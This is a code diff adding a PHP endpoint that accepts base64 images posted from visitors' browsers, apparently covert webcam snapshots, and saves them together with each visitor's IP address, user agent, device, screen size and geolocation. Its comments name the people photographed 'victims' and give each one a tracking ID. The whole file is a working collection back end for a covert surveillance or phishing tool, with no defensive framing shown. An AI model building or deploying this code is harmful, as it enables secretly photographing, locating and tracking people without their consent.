@@ -1,0 +1,85 @@
+<?php
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit;
+}
+
+$captureDir = 'captures/';
+
+if (!file_exists($captureDir)) {
+    mkdir($captureDir, 0777, true);
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $input = file_get_contents('php://input');
+    $data = json_decode($input, true);
+
+    if (!$data || !isset($data['image'])) {
+        http_response_code(400);
+        echo "ERROR: No image data";
+        exit;
+    }
+
+    $imageData = $data['image'];
+    $imageData = str_replace('data:image/jpeg;base64,', '', $imageData);
+    $imageData = str_replace('data:image/png;base64,', '', $imageData);
+    $imageData = str_replace(' ', '+', $imageData);
+    $imageData = base64_decode($imageData);
+
+    if ($imageData === false) {
+        http_response_code(400);
+        echo "ERROR: Invalid base64";
+        exit;
+    }
+
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $timestamp = date('Y-m-d_H-i-s');
+    $num = $data['num'] ?? 0;
+    $userAgent = $data['userAgent'] ?? 'unknown';
+    $device = $data['device'] ?? 'unknown';
+    $location = $data['location'] ?? null;
+    $language = $data['language'] ?? 'unknown';
+    $platform = $data['platform'] ?? 'unknown';
+    $screenWidth = $data['screenWidth'] ?? 'unknown';
+    $screenHeight = $data['screenHeight'] ?? 'unknown';
+
+    // Create a session/ID for this victim
+    $victimId = md5($ip . $userAgent . date('Y-m-d'));
+
+    // Save image
+    $ipSafe = str_replace('.', '_', $ip);
+    $imageFile = $captureDir . $timestamp . '_' . $ipSafe . '_' . $num . '.jpg';
+    file_put_contents($imageFile, $imageData);
+
+    // Save JSON info
+    $jsonFile = $captureDir . $victimId . '_info.json';
+    
+    $info = [
+        'timestamp' => $timestamp,
+        'ip' => $ip,
+        'userAgent' => $userAgent,
+        'device' => $device,
+        'platform' => $platform,
+        'language' => $language,
+        'screen' => $screenWidth . 'x' . $screenHeight,
+        'location' => $location,
+        'imageFile' => $imageFile,
+        'captureNum' => $num
+    ];
+
+    // Append to existing or create new
+    $existing = [];
+    if (file_exists($jsonFile)) {
+        $existing = json_decode(file_get_contents($jsonFile), true) ?? [];
+        if (!is_array($existing)) $existing = [];
+    }
+    $existing[] = $info;
+    file_put_contents($jsonFile, json_encode($existing, JSON_PRETTY_PRINT));
+
+    echo "OK: Capture #" . $num . " saved";
+}
+?>
